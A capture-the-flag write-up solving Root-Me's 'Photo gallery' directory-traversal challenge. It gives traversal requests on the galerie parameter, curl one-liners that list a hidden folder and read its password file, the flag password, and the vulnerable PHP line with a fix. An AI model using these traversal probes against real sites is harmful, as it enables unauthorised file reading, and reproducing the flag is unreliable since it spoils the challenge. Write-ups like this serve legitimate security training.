# Root-Me — Web-Server: Directory traversal (ch15) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch15/ch15.php
**Challenge:** Photo gallery v 0.01 (25 pts, author g0uZ)
**Goal:** Find the hidden section of the photo gallery.

## Answer

Hidden section (directory): `86hwnX2r`

Validation password read from `galerie/86hwnX2r/password.txt`:

```
kcb$!Bx@v4Gs9Ez
```

> Byte-exact file content is `kcb$!Bx@v4Gs9Ez ` + LF (17 bytes total, 16 chars).
> There is a **trailing space** before the newline. Try the password without the
> trailing space first; if the validator says "Just try again!", try it with the
> trailing space appended.

## How it was solved

### 1. Identify the injection point
The page renders a menu built from a `galerie` GET parameter and lists images from
`galerie/<value>/`:

```
ch15.php?galerie=apps
```

So the parameter is a filesystem path fragment concatenated into a directory listing —
a textbook directory-traversal sink.

### 2. Prove traversal works (and that the probe reaches the code)
| Request | Result |
|---|---|
| `?galerie=.` | lists the contents of `galerie/` **including a directory not in the menu** |
| `?galerie=../` | lists the parent dir: `galerie`, `ch15.php` |
| `?galerie=../../web-serveur/ch15/galerie` | PHP warning: `file_exists(): open_basedir restriction in effect. File(galerie/../../web-serveur/ch15/galerie) is not within the allowed path(s): (/challenge/web-serveur/ch15:/tmp) in /challenge/web-serveur/ch15/ch15.php on line 32` |

That warning is the key evidence: it names the real script path, line 32, and the
`open_basedir` allow-list. It proves the value is passed verbatim to `file_exists()`
and that the vulnerable path is genuinely reached (not swallowed by validation).

Note the allow-list `/challenge/web-serveur/ch15:/tmp` — traversal is only possible
*within* the challenge directory (and `/tmp`), which is exactly what this challenge needs.

### 3. Find the hidden section
`?galerie=.` returns entries the menu never links:

```
86hwnX2r   emotes   apps   devices   categories   actions
```

`86hwnX2r` is the hidden section. Fetching `/galerie/86hwnX2r/` directly gives
`403 Forbidden` (nginx autoindex off), so it must be enumerated through the vulnerable
parameter.

### 4. Enumerate it and read the secret
`?galerie=86hwnX2r` lists the hidden directory's contents:

```
galerie/86hwnX2r/password.txt
galerie/86hwnX2r/hacked_web.jpg
galerie/86hwnX2r/secret.png
```

Then just fetch the file:

```bash
curl "http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt"
# -> kcb$!Bx@v4Gs9Ez
```

## One-liner reproduction

```bash
curl -s "http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=." \
  | grep -o '86hwnX2r' | head -1

curl -s "http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r" \
  | grep -o '86hwnX2r/[^"]*'

curl -s "http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt"
```

## Root cause

`ch15.php` builds a path from user input without sanitising `../`:

```php
$dir = "galerie/" . $_GET['galerie'];   // no basename(), no realpath() check
if (file_exists($dir)) { /* scandir + render */ }
```

`open_basedir` limits the blast radius to the challenge folder, but within that folder
an attacker can list and read anything — including directories deliberately kept out of
the menu. Fix: `basename($_GET['galerie'])`, or `realpath()` + prefix check against the
gallery root.
